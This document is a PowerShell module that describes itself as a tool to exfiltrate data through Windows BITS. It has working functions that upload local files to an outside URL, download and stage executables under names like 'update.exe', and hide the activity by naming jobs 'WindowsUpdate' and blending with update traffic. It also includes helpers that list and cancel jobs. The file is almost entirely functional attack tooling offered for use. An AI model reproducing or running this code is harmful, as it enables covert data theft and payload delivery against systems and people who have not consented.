<#
.SYNOPSIS
    Exfiltrate data via BITS (Background Intelligent Transfer Service)

.DESCRIPTION
    Uses Windows BITS for file transfers. BITS is designed for resilient
    background transfers and is commonly used by Windows Update.

    Advantages:
    - Transfers resume after interruptions
    - Throttles to avoid network impact
    - Looks like legitimate Windows Update traffic

.AUTHOR
    Anubhav Gain (@anubhavg-icpl)

.PARAMETER FilePath
    Local file to upload

.PARAMETER Url
    Destination URL

.PARAMETER JobName
    BITS job name (default: WindowsUpdate)

.EXAMPLE
    Invoke-BITSExfil -FilePath C:\data.zip -Url "http://your-server.com/upload/data.zip"
    Invoke-BITSExfil -Download -Url "http://server.com/payload.exe" -Destination C:\temp\update.exe
#>

function Invoke-BITSExfil {
    [CmdletBinding()]
    param(
        [Parameter(ParameterSetName = 'Upload', Mandatory)]
        [string]$FilePath,

        [Parameter(Mandatory)]
        [string]$Url,

        [Parameter(ParameterSetName = 'Download')]
        [switch]$Download,

        [Parameter(ParameterSetName = 'Download')]
        [string]$Destination,

        [string]$JobName = "WindowsUpdate$(Get-Random -Maximum 9999)",

        [ValidateSet('Foreground', 'High', 'Normal', 'Low')]
        [string]$Priority = 'Normal'
    )

    Write-Host @"

============================================================
  BITS TRANSFER
============================================================
  Job: $JobName
  Priority: $Priority
  Mode: $(if ($Download) { 'Download' } else { 'Upload' })
============================================================

"@ -ForegroundColor Cyan

    try {
        if ($Download) {
            # Download file using BITS
            if (-not $Destination) {
                $Destination = Join-Path $env:TEMP (Split-Path $Url -Leaf)
            }

            Write-Host "[*] Downloading: $Url" -ForegroundColor Yellow
            Write-Host "[*] Destination: $Destination" -ForegroundColor Yellow

            # Using bitsadmin for broader compatibility
            $result = bitsadmin /transfer $JobName /priority $Priority.ToUpper() $Url $Destination 2>&1

            if (Test-Path $Destination) {
                Write-Host "[+] Download complete: $Destination" -ForegroundColor Green
            }
            else {
                Write-Error "Download failed: $result"
            }
        }
        else {
            # Upload file using BITS
            if (-not (Test-Path $FilePath)) {
                Write-Error "File not found: $FilePath"
                return
            }

            $fileInfo = Get-Item $FilePath
            Write-Host "[*] Uploading: $($fileInfo.Name) ($([math]::Round($fileInfo.Length / 1KB, 2)) KB)" -ForegroundColor Yellow

            # Create BITS job
            $result = bitsadmin /create /upload $JobName 2>&1

            if ($LASTEXITCODE -eq 0) {
                # Add file to job
                bitsadmin /addfile $JobName $Url $FilePath 2>&1 | Out-Null

                # Set priority
                bitsadmin /setpriority $JobName $Priority.ToUpper() 2>&1 | Out-Null

                # Resume the job
                bitsadmin /resume $JobName 2>&1 | Out-Null

                Write-Host "[*] Transfer started in background..." -ForegroundColor Yellow

                # Monitor progress
                $complete = $false
                while (-not $complete) {
                    $status = bitsadmin /info $JobName /verbose 2>&1

                    if ($status -match 'STATE: TRANSFERRED') {
                        bitsadmin /complete $JobName 2>&1 | Out-Null
                        $complete = $true
                        Write-Host "[+] Upload complete" -ForegroundColor Green
                    }
                    elseif ($status -match 'STATE: ERROR|STATE: CANCELLED') {
                        Write-Error "Transfer failed"
                        bitsadmin /cancel $JobName 2>&1 | Out-Null
                        break
                    }
                    else {
                        # Extract progress
                        if ($status -match 'BYTES TRANSFERRED: (\d+)/(\d+)') {
                            $transferred = [int64]$Matches[1]
                            $total = [int64]$Matches[2]
                            if ($total -gt 0) {
                                $percent = [math]::Round(($transferred / $total) * 100, 2)
                                Write-Progress -Activity "Uploading via BITS" -Status "$percent% complete" -PercentComplete $percent
                            }
                        }
                        Start-Sleep -Seconds 1
                    }
                }

                Write-Progress -Activity "Uploading via BITS" -Completed
            }
            else {
                Write-Error "Failed to create BITS job: $result"
            }
        }
    }
    catch {
        Write-Error "BITS transfer failed: $_"

        # Cleanup on error
        bitsadmin /cancel $JobName 2>&1 | Out-Null
    }
}

function Get-BITSJobs {
    <#
    .SYNOPSIS
        List all BITS jobs

    .EXAMPLE
        Get-BITSJobs
    #>
    [CmdletBinding()]
    param()

    Write-Host "[*] Current BITS jobs:" -ForegroundColor Yellow

    $result = bitsadmin /list /allusers 2>&1
    Write-Host $result

    # Also try PowerShell BITS module
    try {
        $jobs = Get-BitsTransfer -AllUsers -ErrorAction SilentlyContinue
        if ($jobs) {
            return $jobs | Format-Table -AutoSize
        }
    }
    catch { }
}

function Remove-BITSJob {
    <#
    .SYNOPSIS
        Cancel and remove a BITS job

    .EXAMPLE
        Remove-BITSJob -JobName "WindowsUpdate1234"
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$JobName
    )

    Write-Host "[*] Cancelling BITS job: $JobName" -ForegroundColor Yellow

    $result = bitsadmin /cancel $JobName 2>&1

    if ($LASTEXITCODE -eq 0) {
        Write-Host "[+] Job cancelled" -ForegroundColor Green
    }
    else {
        Write-Warning "Cancel result: $result"
    }
}

# Export functions
Export-ModuleMember -Function Invoke-BITSExfil, Get-BITSJobs, Remove-BITSJob
